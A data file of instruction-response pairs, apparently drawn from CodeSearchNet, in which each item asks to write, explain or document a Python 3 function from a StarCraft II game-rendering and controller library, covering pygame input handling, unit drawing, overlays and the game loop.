{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting actions from the UI apply to controller and return an ActionCmd.", "response": "def get_actions(self, run_config, controller):\n    \"\"\"Get actions from the UI, apply to controller, and return an ActionCmd.\"\"\"\n    if not self._initialized:\n      return ActionCmd.STEP\n\n    for event in pygame.event.get():\n      ctrl = pygame.key.get_mods() & pygame.KMOD_CTRL\n      shift = pygame.key.get_mods() & pygame.KMOD_SHIFT\n      alt = pygame.key.get_mods() & pygame.KMOD_ALT\n      if event.type == pygame.QUIT:\n        return ActionCmd.QUIT\n      elif event.type == pygame.KEYDOWN:\n        if self._help:\n          self._help = False\n        elif event.key in (pygame.K_QUESTION, pygame.K_SLASH):\n          self._help = True\n        elif event.key == pygame.K_PAUSE:\n          pause = True\n          while pause:\n            time.sleep(0.1)\n            for event2 in pygame.event.get():\n              if event2.type == pygame.KEYDOWN:\n                if event2.key in (pygame.K_PAUSE, pygame.K_ESCAPE):\n                  pause = False\n                elif event2.key == pygame.K_F4:\n                  return ActionCmd.QUIT\n                elif event2.key == pygame.K_F5:\n                  return ActionCmd.RESTART\n        elif event.key == pygame.K_F4:\n          return ActionCmd.QUIT\n        elif event.key == pygame.K_F5:\n          return ActionCmd.RESTART\n        elif event.key == pygame.K_F7:  # Toggle rgb rendering.\n          if self._rgb_screen_px and self._feature_screen_px:\n            self._render_rgb = not self._render_rgb\n            print(\"Rendering\", self._render_rgb and \"RGB\" or \"Feature Layers\")\n            self.init_window()\n        elif event.key == pygame.K_F8:  # Toggle synchronous rendering.\n          self._render_sync = not self._render_sync\n          print(\"Rendering\", self._render_sync and \"Sync\" or \"Async\")\n        elif event.key == pygame.K_F9:  # Save a replay.\n          self.save_replay(run_config, controller)\n        elif event.key in (pygame.K_PLUS, pygame.K_EQUALS) and ctrl:\n          self.zoom(1.1)  # zoom in\n        elif event.key in (pygame.K_MINUS, pygame.K_UNDERSCORE) and ctrl:\n          self.zoom(1 / 1.1)  # zoom out\n        elif event.key in (pygame.K_PAGEUP, pygame.K_PAGEDOWN):\n          if ctrl:\n            if event.key == pygame.K_PAGEUP:\n              self._step_mul += 1\n            elif self._step_mul > 1:\n              self._step_mul -= 1\n            print(\"New step mul:\", self._step_mul)\n          else:\n            self._fps *= 1.25 if event.key == pygame.K_PAGEUP else 1 / 1.25\n            print(\"New max game speed: %.1f\" % self._fps)\n        elif event.key == pygame.K_F1:\n          if self._obs.observation.player_common.idle_worker_count > 0:\n            controller.act(self.select_idle_worker(ctrl, shift))\n        elif event.key == pygame.K_F2:\n          if self._obs.observation.player_common.army_count > 0:\n            controller.act(self.select_army(shift))\n        elif event.key == pygame.K_F3:\n          if self._obs.observation.player_common.warp_gate_count > 0:\n            controller.act(self.select_warp_gates(shift))\n          if self._obs.observation.player_common.larva_count > 0:\n            controller.act(self.select_larva())\n        elif event.key in self.cmd_group_keys:\n          controller.act(self.control_group(self.cmd_group_keys[event.key],\n                                            ctrl, shift, alt))\n        elif event.key in self.camera_actions:\n          if self._obs:\n            controller.act(self.camera_action_raw(\n                point.Point.build(\n                    self._obs.observation.raw_data.player.camera) +\n                self.camera_actions[event.key]))\n        elif event.key == pygame.K_ESCAPE:\n          if self._queued_action:\n            self.clear_queued_action()\n          else:\n            cmds = self._abilities(lambda cmd: cmd.hotkey == \"escape\")  # Cancel\n            for cmd in cmds:  # There could be multiple cancels.\n              assert not cmd.requires_point\n              controller.act(self.unit_action(cmd, None, shift))\n        else:\n          if not self._queued_action:\n            key = pygame.key.name(event.key).lower()\n            new_cmd = self._queued_hotkey + key\n            cmds = self._abilities(lambda cmd, n=new_cmd: (  # pylint: disable=g-long-lambda\n                cmd.hotkey != \"escape\" and cmd.hotkey.startswith(n)))\n            if cmds:\n              self._queued_hotkey = new_cmd\n              if len(cmds) == 1:\n                cmd = cmds[0]\n                if cmd.hotkey == self._queued_hotkey:\n                  if cmd.requires_point:\n                    self.clear_queued_action()\n                    self._queued_action = cmd\n                  else:\n                    controller.act(self.unit_action(cmd, None, shift))\n      elif event.type == pygame.MOUSEBUTTONDOWN:\n        mouse_pos = self.get_mouse_pos(event.pos)\n        if event.button == MouseButtons.LEFT and mouse_pos:\n          if self._queued_action:\n            controller.act(self.unit_action(\n                self._queued_action, mouse_pos, shift))\n          elif mouse_pos.surf.surf_type & SurfType.MINIMAP:\n            controller.act(self.camera_action(mouse_pos))\n          else:\n            self._select_start = mouse_pos\n        elif event.button == MouseButtons.RIGHT:\n          if self._queued_action:\n            self.clear_queued_action()\n          cmds = self._abilities(lambda cmd: cmd.name == \"Smart\")\n          if cmds:\n            controller.act(self.unit_action(cmds[0], mouse_pos, shift))\n      elif event.type == pygame.MOUSEBUTTONUP:\n        mouse_pos = self.get_mouse_pos(event.pos)\n        if event.button == MouseButtons.LEFT and self._select_start:\n          if (mouse_pos and mouse_pos.surf.surf_type & SurfType.SCREEN and\n              mouse_pos.surf.surf_type == self._select_start.surf.surf_type):\n            controller.act(self.select_action(\n                self._select_start, mouse_pos, ctrl, shift))\n          self._select_start = None\n    return ActionCmd.STEP"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef camera_action(self, mouse_pos):\n    action = sc_pb.Action()\n    action_spatial = mouse_pos.action_spatial(action)\n    mouse_pos.obs_pos.assign_to(action_spatial.camera_move.center_minimap)\n    return action", "response": "Return a sc_pb. Action with the camera movement filled."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef camera_action_raw(self, world_pos):\n    action = sc_pb.Action()\n    world_pos.assign_to(action.action_raw.camera_move.center_world_space)\n    return action", "response": "Return a sc_pb. Action with the camera movement filled."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef select_action(self, pos1, pos2, ctrl, shift):\n    assert pos1.surf.surf_type == pos2.surf.surf_type\n    assert pos1.surf.world_to_obs == pos2.surf.world_to_obs\n\n    action = sc_pb.Action()\n    action_spatial = pos1.action_spatial(action)\n\n    if pos1.world_pos == pos2.world_pos:  # select a point\n      select = action_spatial.unit_selection_point\n      pos1.obs_pos.assign_to(select.selection_screen_coord)\n      mod = sc_spatial.ActionSpatialUnitSelectionPoint\n      if ctrl:\n        select.type = mod.AddAllType if shift else mod.AllType\n      else:\n        select.type = mod.Toggle if shift else mod.Select\n    else:\n      select = action_spatial.unit_selection_rect\n      rect = select.selection_screen_coord.add()\n      pos1.obs_pos.assign_to(rect.p0)\n      pos2.obs_pos.assign_to(rect.p1)\n      select.selection_add = shift\n\n    # Clear the queued action if something will be selected. An alternative\n    # implementation may check whether the selection changed next frame.\n    units = self._units_in_area(point.Rect(pos1.world_pos, pos2.world_pos))\n    if units:\n      self.clear_queued_action()\n\n    return action", "response": "Select an action with the selection filled."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nselect an idle worker.", "response": "def select_idle_worker(self, ctrl, shift):\n    \"\"\"Select an idle worker.\"\"\"\n    action = sc_pb.Action()\n    mod = sc_ui.ActionSelectIdleWorker\n    if ctrl:\n      select_worker = mod.AddAll if shift else mod.All\n    else:\n      select_worker = mod.Add if shift else mod.Set\n    action.action_ui.select_idle_worker.type = select_worker\n    return action"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef select_army(self, shift):\n    action = sc_pb.Action()\n    action.action_ui.select_army.selection_add = shift\n    return action", "response": "Select the entire army."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nselects all warp gates.", "response": "def select_warp_gates(self, shift):\n    \"\"\"Select all warp gates.\"\"\"\n    action = sc_pb.Action()\n    action.action_ui.select_warp_gates.selection_add = shift\n    return action"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nacting on a control group selecting setting etc.", "response": "def control_group(self, control_group_id, ctrl, shift, alt):\n    \"\"\"Act on a control group, selecting, setting, etc.\"\"\"\n    action = sc_pb.Action()\n    select = action.action_ui.control_group\n\n    mod = sc_ui.ActionControlGroup\n    if not ctrl and not shift and not alt:\n      select.action = mod.Recall\n    elif ctrl and not shift and not alt:\n      select.action = mod.Set\n    elif not ctrl and shift and not alt:\n      select.action = mod.Append\n    elif not ctrl and not shift and alt:\n      select.action = mod.SetAndSteal\n    elif not ctrl and shift and alt:\n      select.action = mod.AppendAndSteal\n    else:\n      return  # unknown\n    select.control_group_index = control_group_id\n    return action"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a sc_pb. Action filled with the cmd and appropriate target.", "response": "def unit_action(self, cmd, pos, shift):\n    \"\"\"Return a `sc_pb.Action` filled with the cmd and appropriate target.\"\"\"\n    action = sc_pb.Action()\n    if pos:\n      action_spatial = pos.action_spatial(action)\n      unit_command = action_spatial.unit_command\n      unit_command.ability_id = cmd.ability_id\n      unit_command.queue_command = shift\n      if pos.surf.surf_type & SurfType.SCREEN:\n        pos.obs_pos.assign_to(unit_command.target_screen_coord)\n      elif pos.surf.surf_type & SurfType.MINIMAP:\n        pos.obs_pos.assign_to(unit_command.target_minimap_coord)\n    else:\n      if self._feature_screen_px:\n        action.action_feature_layer.unit_command.ability_id = cmd.ability_id\n      else:\n        action.action_render.unit_command.ability_id = cmd.ability_id\n\n    self.clear_queued_action()\n    return action"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _abilities(self, fn=None):\n    out = {}\n    for cmd in self._obs.observation.abilities:\n      ability = _Ability(cmd, self._static_data.abilities)\n      if not fn or fn(ability):\n        out[ability.ability_id] = ability\n    return list(out.values())", "response": "Return the list of abilities filtered by fn."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _visible_units(self):\n    # Sort the units by elevation, then owned (eg refinery) above world (ie 16)\n    # (eg geiser), small above big, and otherwise arbitrary but stable.\n    for u in sorted(self._obs.observation.raw_data.units,\n                    key=lambda u: (u.pos.z, u.owner != 16, -u.radius, u.tag)):\n      yield u, point.Point.build(u.pos)", "response": "A generator of visible units and their positions as Points sorted."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the list of units that intersect the rect.", "response": "def _units_in_area(self, rect):\n    \"\"\"Return the list of units that intersect the rect.\"\"\"\n    player_id = self._obs.observation.player_common.player_id\n    return [u for u, p in self._visible_units()\n            if rect.intersects_circle(p, u.radius) and u.owner == player_id]"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets a length limited unit name for drawing units.", "response": "def get_unit_name(self, surf, name, radius):\n    \"\"\"Get a length limited unit name for drawing units.\"\"\"\n    key = (name, radius)\n    if key not in self._name_lengths:\n      max_len = surf.world_to_surf.fwd_dist(radius * 1.6)\n      for i in range(len(name)):\n        if self._font_small.size(name[:i + 1])[0] > max_len:\n          self._name_lengths[key] = name[:i]\n          break\n      else:\n        self._name_lengths[key] = name\n    return self._name_lengths[key]"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef draw_units(self, surf):\n    for u, p in self._visible_units():\n      if self._camera.intersects_circle(p, u.radius):\n        fraction_damage = clamp((u.health_max - u.health) / (u.health_max or 1),\n                                0, 1)\n        surf.draw_circle(colors.PLAYER_ABSOLUTE_PALETTE[u.owner], p, u.radius)\n\n        if fraction_damage > 0:\n          surf.draw_circle(colors.PLAYER_ABSOLUTE_PALETTE[u.owner] // 2,\n                           p, u.radius * fraction_damage)\n\n        if u.shield and u.shield_max:\n          surf.draw_arc(colors.blue, p, u.radius, 0,\n                        2 * math.pi * u.shield / u.shield_max)\n        if u.energy and u.energy_max:\n          surf.draw_arc(colors.purple * 0.75, p, u.radius - 0.05, 0,\n                        2 * math.pi * u.energy / u.energy_max)\n\n        name = self.get_unit_name(\n            surf, self._static_data.units.get(u.unit_type, \"<none>\"), u.radius)\n        if name:\n          text = self._font_small.render(name, True, colors.white)\n          rect = text.get_rect()\n          rect.center = surf.world_to_surf.fwd_pt(p)\n          surf.surf.blit(text, rect)\n\n        if u.is_selected:\n          surf.draw_circle(colors.green, p, u.radius + 0.1, 1)", "response": "Draw the units and buildings."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef draw_selection(self, surf):\n    select_start = self._select_start  # Cache to avoid a race condition.\n    if select_start:\n      mouse_pos = self.get_mouse_pos()\n      if (mouse_pos and mouse_pos.surf.surf_type & SurfType.SCREEN and\n          mouse_pos.surf.surf_type == select_start.surf.surf_type):\n        rect = point.Rect(select_start.world_pos, mouse_pos.world_pos)\n        surf.draw_rect(colors.green, rect, 1)", "response": "Draw the selection rectange."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef draw_build_target(self, surf):\n    round_half = lambda v, cond: round(v - 0.5) + 0.5 if cond else round(v)\n\n    queued_action = self._queued_action\n    if queued_action:\n      radius = queued_action.footprint_radius\n      if radius:\n        pos = self.get_mouse_pos()\n        if pos:\n          pos = point.Point(round_half(pos.world_pos.x, (radius * 2) % 2),\n                            round_half(pos.world_pos.y, (radius * 2) % 2))\n          surf.draw_circle(\n              colors.PLAYER_ABSOLUTE_PALETTE[\n                  self._obs.observation.player_common.player_id],\n              pos, radius)", "response": "Draw the build target."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef draw_overlay(self, surf):\n    obs = self._obs.observation\n    player = obs.player_common\n    surf.write_screen(\n        self._font_large, colors.green, (0.2, 0.2),\n        \"Minerals: %s, Vespene: %s, Food: %s / %s\" % (\n            player.minerals, player.vespene, player.food_used, player.food_cap))\n    times, steps = zip(*self._game_times)\n    sec = obs.game_loop // 22.4  # http://liquipedia.net/starcraft2/Game_Speed\n    surf.write_screen(\n        self._font_large, colors.green, (-0.2, 0.2),\n        \"Score: %s, Step: %s, %.1f/s, Time: %d:%02d\" % (\n            obs.score.score, obs.game_loop, sum(steps) / (sum(times) or 1),\n            sec // 60, sec % 60),\n        align=\"right\")\n    surf.write_screen(\n        self._font_large, colors.green * 0.8, (-0.2, 1.2),\n        \"FPS: O:%.1f, R:%.1f\" % (\n            len(times) / (sum(times) or 1),\n            len(self._render_times) / (sum(self._render_times) or 1)),\n        align=\"right\")\n    line = 3\n    for alert, ts in sorted(self._alerts.items(), key=lambda item: item[1]):\n      if time.time() < ts + 3:  # Show for 3 seconds.\n        surf.write_screen(self._font_large, colors.red, (20, line), alert)\n        line += 1\n      else:\n        del self._alerts[alert]", "response": "Draw the overlay describing resources."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef draw_help(self, surf):\n    if not self._help:\n      return\n\n    def write(loc, text):\n      surf.write_screen(self._font_large, colors.black, loc, text)\n\n    surf.surf.fill(colors.white * 0.8)\n    write((1, 1), \"Shortcuts:\")\n\n    max_len = max(len(s) for s, _ in self.shortcuts)\n    for i, (hotkey, description) in enumerate(self.shortcuts, start=2):\n      write((2, i), hotkey)\n      write((3 + max_len * 0.7, i), description)", "response": "Draw the help dialog."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef draw_commands(self, surf):\n    past_abilities = {act.ability for act in self._past_actions if act.ability}\n    for y, cmd in enumerate(sorted(self._abilities(\n        lambda c: c.name != \"Smart\"), key=lambda c: c.name), start=2):\n      if self._queued_action and cmd == self._queued_action:\n        color = colors.green\n      elif self._queued_hotkey and cmd.hotkey.startswith(self._queued_hotkey):\n        color = colors.green * 0.75\n      elif cmd.ability_id in past_abilities:\n        color = colors.red\n      else:\n        color = colors.yellow\n      hotkey = cmd.hotkey[0:3]  # truncate \"escape\" -> \"esc\"\n      surf.write_screen(self._font_large, color, (0.2, y), hotkey)\n      surf.write_screen(self._font_large, color, (3, y), cmd.name)", "response": "Draw the list of available commands."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndraw the unit selection or build queue.", "response": "def draw_panel(self, surf):\n    \"\"\"Draw the unit selection or build queue.\"\"\"\n\n    left = -12  # How far from the right border\n\n    def unit_name(unit_type):\n      return self._static_data.units.get(unit_type, \"<unknown>\")\n\n    def write(loc, text, color=colors.yellow):\n      surf.write_screen(self._font_large, color, loc, text)\n\n    def write_single(unit, line):\n      write((left + 1, next(line)), unit_name(unit.unit_type))\n      write((left + 1, next(line)), \"Health: %s\" % unit.health)\n      write((left + 1, next(line)), \"Shields: %s\" % unit.shields)\n      write((left + 1, next(line)), \"Energy: %s\" % unit.energy)\n      if unit.build_progress > 0:\n        write((left + 1, next(line)),\n              \"Progress: %d%%\" % (unit.build_progress * 100))\n      if unit.transport_slots_taken > 0:\n        write((left + 1, next(line)), \"Slots: %s\" % unit.transport_slots_taken)\n\n    def write_multi(units, line):\n      counts = collections.defaultdict(int)\n      for unit in units:\n        counts[unit_name(unit.unit_type)] += 1\n      for name, count in sorted(counts.items()):\n        y = next(line)\n        write((left + 1, y), count)\n        write((left + 3, y), name)\n\n    ui = self._obs.observation.ui_data\n    line = itertools.count(3)\n\n    if ui.groups:\n      write((left, next(line)), \"Control Groups:\", colors.green)\n      for group in ui.groups:\n        y = next(line)\n        write((left + 1, y), \"%s:\" % group.control_group_index, colors.green)\n        write((left + 3, y), \"%s %s\" % (group.count,\n                                        unit_name(group.leader_unit_type)))\n      next(line)\n\n    if ui.HasField(\"single\"):\n      write((left, next(line)), \"Selection:\", colors.green)\n      write_single(ui.single.unit, line)\n    elif ui.HasField(\"multi\"):\n      write((left, next(line)), \"Selection:\", colors.green)\n      write_multi(ui.multi.units, line)\n    elif ui.HasField(\"cargo\"):\n      write((left, next(line)), \"Selection:\", colors.green)\n      write_single(ui.cargo.unit, line)\n      next(line)\n      write((left, next(line)), \"Cargo:\", colors.green)\n      write((left + 1, next(line)),\n            \"Empty slots: %s\" % ui.cargo.slots_available)\n      write_multi(ui.cargo.passengers, line)\n    elif ui.HasField(\"production\"):\n      write((left, next(line)), \"Selection:\", colors.green)\n      write_single(ui.production.unit, line)\n      next(line)\n      write((left, next(line)), \"Build Queue:\", colors.green)\n      for unit in ui.production.build_queue:\n        s = unit_name(unit.unit_type)\n        if unit.build_progress > 0:\n          s += \": %d%%\" % (unit.build_progress * 100)\n        write((left + 1, next(line)), s)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndraws the actions so that they can be inspected for accuracy.", "response": "def draw_actions(self):\n    \"\"\"Draw the actions so that they can be inspected for accuracy.\"\"\"\n    now = time.time()\n    for act in self._past_actions:\n      if act.pos and now < act.deadline:\n        remain = (act.deadline - now) / (act.deadline - act.time)\n        if isinstance(act.pos, point.Point):\n          size = remain / 3\n          self.all_surfs(_Surface.draw_circle, act.color, act.pos, size, 1)\n        else:\n          # Fade with alpha would be nice, but doesn't seem to work.\n          self.all_surfs(_Surface.draw_rect, act.color, act.pos, 1)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nprepare the list of past actions so they can be drawn.", "response": "def prepare_actions(self, obs):\n    \"\"\"Keep a list of the past actions so they can be drawn.\"\"\"\n    now = time.time()\n    while self._past_actions and self._past_actions[0].deadline < now:\n      self._past_actions.pop(0)\n\n    def add_act(ability_id, color, pos, timeout=1):\n      if ability_id:\n        ability = self._static_data.abilities[ability_id]\n        if ability.remaps_to_ability_id:  # Prefer general abilities.\n          ability_id = ability.remaps_to_ability_id\n      self._past_actions.append(\n          PastAction(ability_id, color, pos, now, now + timeout))\n\n    for act in obs.actions:\n      if (act.HasField(\"action_raw\") and\n          act.action_raw.HasField(\"unit_command\") and\n          act.action_raw.unit_command.HasField(\"target_world_space_pos\")):\n        pos = point.Point.build(\n            act.action_raw.unit_command.target_world_space_pos)\n        add_act(act.action_raw.unit_command.ability_id, colors.yellow, pos)\n      if act.HasField(\"action_feature_layer\"):\n        act_fl = act.action_feature_layer\n        if act_fl.HasField(\"unit_command\"):\n          if act_fl.unit_command.HasField(\"target_screen_coord\"):\n            pos = self._world_to_feature_screen_px.back_pt(\n                point.Point.build(act_fl.unit_command.target_screen_coord))\n            add_act(act_fl.unit_command.ability_id, colors.cyan, pos)\n          elif act_fl.unit_command.HasField(\"target_minimap_coord\"):\n            pos = self._world_to_feature_minimap_px.back_pt(\n                point.Point.build(act_fl.unit_command.target_minimap_coord))\n            add_act(act_fl.unit_command.ability_id, colors.cyan, pos)\n          else:\n            add_act(act_fl.unit_command.ability_id, None, None)\n        if (act_fl.HasField(\"unit_selection_point\") and\n            act_fl.unit_selection_point.HasField(\"selection_screen_coord\")):\n          pos = self._world_to_feature_screen_px.back_pt(point.Point.build(\n              act_fl.unit_selection_point.selection_screen_coord))\n          add_act(None, colors.cyan, pos)\n        if act_fl.HasField(\"unit_selection_rect\"):\n          for r in act_fl.unit_selection_rect.selection_screen_coord:\n            rect = point.Rect(\n                self._world_to_feature_screen_px.back_pt(\n                    point.Point.build(r.p0)),\n                self._world_to_feature_screen_px.back_pt(\n                    point.Point.build(r.p1)))\n            add_act(None, colors.cyan, rect, 0.3)\n      if act.HasField(\"action_render\"):\n        act_rgb = act.action_render\n        if act_rgb.HasField(\"unit_command\"):\n          if act_rgb.unit_command.HasField(\"target_screen_coord\"):\n            pos = self._world_to_rgb_screen_px.back_pt(\n                point.Point.build(act_rgb.unit_command.target_screen_coord))\n            add_act(act_rgb.unit_command.ability_id, colors.red, pos)\n          elif act_rgb.unit_command.HasField(\"target_minimap_coord\"):\n            pos = self._world_to_rgb_minimap_px.back_pt(\n                point.Point.build(act_rgb.unit_command.target_minimap_coord))\n            add_act(act_rgb.unit_command.ability_id, colors.red, pos)\n          else:\n            add_act(act_rgb.unit_command.ability_id, None, None)\n        if (act_rgb.HasField(\"unit_selection_point\") and\n            act_rgb.unit_selection_point.HasField(\"selection_screen_coord\")):\n          pos = self._world_to_rgb_screen_px.back_pt(point.Point.build(\n              act_rgb.unit_selection_point.selection_screen_coord))\n          add_act(None, colors.red, pos)\n        if act_rgb.HasField(\"unit_selection_rect\"):\n          for r in act_rgb.unit_selection_rect.selection_screen_coord:\n            rect = point.Rect(\n                self._world_to_rgb_screen_px.back_pt(\n                    point.Point.build(r.p0)),\n                self._world_to_rgb_screen_px.back_pt(\n                    point.Point.build(r.p1)))\n            add_act(None, colors.red, rect, 0.3)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndraw the base map.", "response": "def draw_base_map(self, surf):\n    \"\"\"Draw the base map.\"\"\"\n    hmap_feature = features.SCREEN_FEATURES.height_map\n    hmap = hmap_feature.unpack(self._obs.observation)\n    if not hmap.any():\n      hmap = hmap + 100  # pylint: disable=g-no-augmented-assignment\n    hmap_color = hmap_feature.color(hmap)\n\n    creep_feature = features.SCREEN_FEATURES.creep\n    creep = creep_feature.unpack(self._obs.observation)\n    creep_mask = creep > 0\n    creep_color = creep_feature.color(creep)\n\n    power_feature = features.SCREEN_FEATURES.power\n    power = power_feature.unpack(self._obs.observation)\n    power_mask = power > 0\n    power_color = power_feature.color(power)\n\n    visibility = features.SCREEN_FEATURES.visibility_map.unpack(\n        self._obs.observation)\n    visibility_fade = np.array([[0.5] * 3, [0.75]*3, [1]*3])\n\n    out = hmap_color * 0.6\n    out[creep_mask, :] = (0.4 * out[creep_mask, :] +\n                          0.6 * creep_color[creep_mask, :])\n    out[power_mask, :] = (0.7 * out[power_mask, :] +\n                          0.3 * power_color[power_mask, :])\n    out *= visibility_fade[visibility]\n\n    surf.blit_np_array(out)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef draw_rendered_map(self, surf):\n    surf.blit_np_array(features.Feature.unpack_rgb_image(\n        self._obs.observation.render_data.map))", "response": "Draw the rendered pixels."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndrawing the screen area.", "response": "def draw_screen(self, surf):\n    \"\"\"Draw the screen area.\"\"\"\n    # surf.fill(colors.black)\n    if (self._render_rgb and self._obs.observation.HasField(\"render_data\") and\n        self._obs.observation.render_data.HasField(\"map\")):\n      self.draw_rendered_map(surf)\n    else:\n      self.draw_base_map(surf)\n      self.draw_units(surf)\n    self.draw_selection(surf)\n    self.draw_build_target(surf)\n    self.draw_overlay(surf)\n    self.draw_commands(surf)\n    self.draw_panel(surf)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndraws a feature layer.", "response": "def draw_feature_layer(self, surf, feature):\n    \"\"\"Draw a feature layer.\"\"\"\n    layer = feature.unpack(self._obs.observation)\n    if layer is not None:\n      surf.blit_np_array(feature.color(layer))\n    else:  # Ignore layers that aren't in this version of SC2.\n      surf.surf.fill(colors.black)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\npushing an observation onto the queue to be rendered.", "response": "def render(self, obs):\n    \"\"\"Push an observation onto the queue to be rendered.\"\"\"\n    if not self._initialized:\n      return\n    now = time.time()\n    self._game_times.append(\n        (now - self._last_time,\n         max(1, obs.observation.game_loop - self._obs.observation.game_loop)))\n    self._last_time = now\n    self._last_game_loop = self._obs.observation.game_loop\n    self._obs_queue.put(obs)\n    if self._render_sync:\n      self._obs_queue.join()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef render_obs(self, obs):\n    start_time = time.time()\n    self._obs = obs\n    self.check_valid_queued_action()\n    self._update_camera(point.Point.build(\n        self._obs.observation.raw_data.player.camera))\n\n    for surf in self._surfaces:\n      # Render that surface.\n      surf.draw(surf)\n\n    mouse_pos = self.get_mouse_pos()\n    if mouse_pos:\n      # Draw a small mouse cursor\n      self.all_surfs(_Surface.draw_circle, colors.green, mouse_pos.world_pos,\n                     0.1)\n\n    self.draw_actions()\n\n    with sw(\"flip\"):\n      pygame.display.flip()\n\n    self._render_times.append(time.time() - start_time)", "response": "Render a frame given an observation."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef run(self, run_config, controller, max_game_steps=0, max_episodes=0,\n          game_steps_per_episode=0, save_replay=False):\n    \"\"\"Run loop that gets observations, renders them, and sends back actions.\"\"\"\n    is_replay = (controller.status == remote_controller.Status.in_replay)\n    total_game_steps = 0\n    start_time = time.time()\n    num_episodes = 0\n\n    try:\n      while True:\n        self.init(controller.game_info(), controller.data())\n        episode_steps = 0\n        num_episodes += 1\n\n        controller.step()\n\n        while True:\n          total_game_steps += self._step_mul\n          episode_steps += self._step_mul\n          frame_start_time = time.time()\n\n          obs = controller.observe()\n          self.render(obs)\n\n          if obs.player_result:\n            break\n\n          cmd = self.get_actions(run_config, controller)\n          if cmd == ActionCmd.STEP:\n            pass\n          elif cmd == ActionCmd.QUIT:\n            if not is_replay and save_replay:\n              self.save_replay(run_config, controller)\n            return\n          elif cmd == ActionCmd.RESTART:\n            break\n          else:\n            raise Exception(\"Unexpected command: %s\" % cmd)\n\n          controller.step(self._step_mul)\n\n          if max_game_steps and total_game_steps >= max_game_steps:\n            return\n\n          if game_steps_per_episode and episode_steps >= game_steps_per_episode:\n            break\n\n          with sw(\"sleep\"):\n            elapsed_time = time.time() - frame_start_time\n            time.sleep(max(0, 1 / self._fps - elapsed_time))\n\n        if is_replay:\n          break\n\n        if save_replay:\n          self.save_replay(run_config, controller)\n\n        if max_episodes and num_episodes >= max_episodes:\n          break\n\n        print(\"Restarting\")\n        controller.restart()\n    except KeyboardInterrupt:\n      pass\n    finally:\n      self.close()\n      elapsed_time = time.time() - start_time\n      print(\"took %.3f seconds for %s steps: %.3f fps\" %\n            (elapsed_time, total_game_steps, total_game_steps / elapsed_time))", "response": "Runs the game loop."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef catch_websocket_connection_errors():\n  try:\n    yield\n  except websocket.WebSocketConnectionClosedException:\n    raise ConnectionError(\"Connection already closed. SC2 probably crashed. \"\n                          \"Check the error log.\")\n  except websocket.WebSocketTimeoutException:\n    raise ConnectionError(\"Websocket timed out.\")\n  except socket.error as e:\n    raise ConnectionError(\"Socket error: %s\" % e)", "response": "A context manager that translates websocket errors into ConnectionError."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef read(self):\n    if FLAGS.sc2_verbose_protocol:\n      self._log(\" Reading response \".center(60, \"-\"))\n      start = time.time()\n    response = self._read()\n    if FLAGS.sc2_verbose_protocol:\n      self._log(\" %0.1f msec\\n\" % (1000 * (time.time() - start)))\n      self._log_packet(response)\n    if not response.HasField(\"status\"):\n      raise ProtocolError(\"Got an incomplete response without a status.\")\n    prev_status = self._status\n    self._status = Status(response.status)  # pytype: disable=not-callable\n    if response.error:\n      err_str = (\"Error in RPC response (likely a bug). \"\n                 \"Prev status: %s, new status: %s, error:\\n%s\" % (\n                     prev_status, self._status, \"\\n\".join(response.error)))\n      logging.error(err_str)\n      raise ProtocolError(err_str)\n    return response", "response": "Read a Response from the server and validate it."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating and send a specific request and return the response.", "response": "def send(self, **kwargs):\n    \"\"\"Create and send a specific request, and return the response.\n\n    For example: send(ping=sc_pb.RequestPing()) => sc_pb.ResponsePing\n\n    Args:\n      **kwargs: A single kwarg with the name and value to fill in to Request.\n\n    Returns:\n      The Response corresponding to your request.\n    \"\"\"\n    assert len(kwargs) == 1, \"Must make a single request.\"\n    res = self.send_req(sc_pb.Request(**kwargs))\n    return getattr(res, list(kwargs.keys())[0])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _log(self, s):\n    # TODO(tewalds): Should this be using logging.info instead? How to see them\n    # outside of google infrastructure?\n    sys.stderr.write(s)\n    sys.stderr.flush()", "response": "r Log a string."}
